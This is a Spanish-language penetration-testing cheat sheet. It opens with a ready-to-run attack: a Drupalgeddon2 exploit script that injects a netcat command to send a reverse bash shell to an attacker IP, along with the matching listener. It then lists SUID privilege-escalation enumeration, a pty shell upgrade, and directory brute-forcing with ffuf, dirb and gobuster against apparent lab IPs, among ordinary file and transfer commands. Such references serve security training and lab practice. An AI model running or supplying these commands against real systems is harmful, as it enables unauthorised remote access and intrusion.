### Reverse Shell

*   **Atacante:** Establecer una reverse shell utilizando una vulnerabilidad en Drupal y netcat.
    

bash
    python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'  # Explota la vulnerabilidad y establece la conexión.


*   **Objetivo:** Escuchar conexiones entrantes con netcat para recibir la shell.
    

bash
    nc -lnvp 9000  # Escucha en el puerto 9000.



### Enumeración

*   **Buscar archivos SUID:** Identificar archivos con permisos SUID que pueden permitir la elevación de privilegios.
    

bash
    find / -perm -u=s 2>/dev/null  # Busca archivos con el bit SUID activado.


*   **WhatWeb:** Identificar tecnologías utilizadas en un sitio web para identificar posibles vectores de ataque.
    

bash
    whatweb <ip> | awk '{gsub(/], /, "],\n" ); print}'  # Escanea el sitio web y formatea la salida.



### Manipulación de Archivos

*   **Mostrar contenido:**
    

bash
    cat archivo.txt


*   **Codificar en Base64:**
    

bash
    cat archivo.txt | base64


*   **Decodificar Base64:**
    

bash
    echo "cGFsbGFiaHJhcw==" | base64 -d


*   **Calcular hash MD5:**
    

bash
    md5sum archivo.txt


*   **Calcular hash SHA-256:**
    

bash
    sha256sum archivo.txt



### Descarga de Archivos (Wget)

*   **wget**: Permite descargar archivos desde la web a través de HTTP.

    

bash
    wget https://ejemplo.com/archivo.txt  # Descarga un archivo específico
    wget -O nuevo_nombre.txt https://ejemplo.com/archivo.txt  # Guarda el archivo con otro nombre
    wget -r -np -nH https://ejemplo.com/directorio/  # Descarga recursivamente un directorio



### Transferencia de Archivos con SCP (SSH)

*   **scp**: Permite copiar archivos de forma segura entre dos sistemas usando el protocolo SSH.

    

bash
    scp archivo.txt usuario@192.168.1.30:/home/usuario/destino.txt  # Copia un archivo a un sistema remoto
    scp usuario@192.168.1.30:/home/usuario/archivo.txt ./  # Copia un archivo desde un sistema remoto al actual
    scp -r directorio usuario@192.168.1.30:/home/usuario/  # Copia un directorio completo a un sistema remoto



### Servidor Web Simple (Python)

*   **python3 -m http.server**: Inicia un servidor HTTP en el puerto 8000 para compartir archivos localmente.
    

bash
    python3 -m http.server
    python3 -m http.server 8080
    python3 -m http.server --directory /ruta/del/directorio/



### Acceso a un Bash del Sistema con Meterpreter

*   **python -c "import pty; pty.spawn('/bin/bash')"**:  Permite obtener acceso a un bash del sistema a través de Meterpreter.

### Fuerza Bruta y Análisis de Directorios
*   **ffuf**:
    

bash
    ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ


*   **dirb**:
    

bash
    dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt


*   **gobuster**:
    

bash
    gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt




